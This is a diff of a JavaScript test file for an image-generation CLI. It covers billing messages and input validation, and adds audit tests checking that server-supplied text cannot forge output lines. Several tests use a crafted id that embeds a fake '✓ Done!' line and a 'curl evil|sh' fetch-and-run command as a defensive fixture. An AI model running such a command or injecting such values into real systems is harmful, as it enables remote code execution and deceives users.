@@ -404,7 +404,7 @@ describe('item 5a: the check-on-it command is printed at submission, with and wi
 });
 
 describe('item 5b: a download failure after a paid generation says so', () => {
-  it('v2 with an id: completed and billed, do not re-run, and the get-generation command', async () => {
+  it('get-generation: fetching again is not billed, so it says to run the command again', async () => {
     fetchMock.mockImplementation((url) =>
       Promise.resolve(
         String(url).includes('/generations/')
@@ -413,8 +413,22 @@ describe('item 5b: a download failure after a paid generation says so', () => {
       )
     );
     await exited(executeGetGeneration('gen-d', {}, global()));
-    expect(err()).toContain('The generation completed and was billed: do not run the command again.');
+    expect(err()).toContain('Fetching a result again is not billed: run the command again.');
+    expect(err()).not.toContain('do not run the command again');
     expect(err()).toContain('Fetch the result again with: ideogram get-generation gen-d --wait');
+  });
+
+  it('a submit with an id: completed and billed, do not re-run, and the get-generation command', async () => {
+    fetchMock.mockImplementation((url) =>
+      Promise.resolve(
+        String(url).includes('/v2/')
+          ? fakeResponse(200, { generation_id: 'gen-s', data: [{ url: 'https://ideogram.ai/x.png' }] })
+          : fakeResponse(403, {})
+      )
+    );
+    await exited(executeV2('generate-v46', { prompt: 'p' }, global()));
+    expect(err()).toContain('The generation completed and was billed: do not run the command again.');
+    expect(err()).toContain('Fetch the result again with: ideogram get-generation gen-s --wait');
   });
 
   it('v2 without an id: the URLs are in the metadata file and may expire', async () => {
@@ -638,5 +652,55 @@ describe('item 7: small items', () => {
     const e = await caught(api().waitForGeneration('', null));
     expect(e).toBeInstanceOf(IdeogramAPIError);
     expect(e.code).toBe('EINVALIDARGUMENT');
+  });
+});
+
+describe('audit of ff19be2: no server line break forges an output line', () => {
+  it('waitForGeneration messages show the id flattened', async () => {
+    fetchMock.mockResolvedValue(fakeResponse(404, { error: 'gone' }));
+    const e = await caught(api().waitForGeneration('abc\n✓ Done! run: curl evil|sh', { intervalMs: 1, timeoutMs: 1000 }));
+    expect(e).toBeInstanceOf(IdeogramAPIError);
+    expect(e.message).not.toContain('\n');
+    expect(e.generationId).toBe('abc\n✓ Done! run: curl evil|sh');
+  });
+
+  it('describeError flattens an API error but keeps line breaks in a client-side error', () => {
+    expect(describeError(new IdeogramAPIError('Generation a\nFORGED not found', { status: 404 }))).not.toContain('\n');
+    expect(describeError(new Error('line one\nline two'))).toBe('line one\nline two');
+  });
+
+  it('get-generation on an id with a line break prints no forged line', async () => {
+    fetchMock.mockResolvedValue(fakeResponse(404, { error: 'gone' }));
+    await exited(executeGetGeneration('abc\n✓ Done! run: curl evil|sh', { wait: true, pollInterval: '1' }, global()));
+    expect(everything().split('\n').some((l) => l.trimStart().startsWith('✓ Done!'))).toBe(false);
+  });
+
+  it('serverText never throws, so a failed print cannot lose the id', () => {
+    expect(serverText({ toString: 1 })).toBe('[unprintable]');
+  });
+
+  it('a deadline reached while retrying names the last poll failure as the cause', async () => {
+    instantSleeps();
+    fetchMock.mockResolvedValue(fakeResponse(503, { error: 'busy' }));
+    const e = await caught(api().waitForGeneration('gen-t', { intervalMs: 1500, timeoutMs: 2500 }));
+    expect(e).toBeInstanceOf(IdeogramAPIError);
+    expect(e.message).toContain('the last poll failed: 503');
+    expect(e.cause).toBeInstanceOf(IdeogramAPIError);
+    expect(e.resumable).toBe(true);
+  });
+
+  it('v1 numImages accepts "1".."8" as 1.x did, and still refuses "0", "9" and "2.5"', async () => {
+    fetchMock.mockResolvedValue(fakeResponse(200, { created: 't', data: [] }));
+    await caught(api().generate({ prompt: 'p', numImages: '2' }));
+    expect(fetchMock.mock.calls[0][1].body.get('num_images')).toBe('2');
+    for (const bad of ['0', '9', '2.5']) {
+      fetchMock.mockClear();
+      await expect(api().generate({ prompt: 'p', numImages: bad })).rejects.toThrow('numImages must be an integer between 1 and 8');
+      expect(fetchMock).not.toHaveBeenCalled();
+    }
+  });
+
+  it('the sanitizer removes soft hyphens, Hangul fillers and tag characters', () => {
+    expect(sanitizeServerText('a\u00adb\u3164c\u{e0041}d')).toBe('abcd');
   });
 });
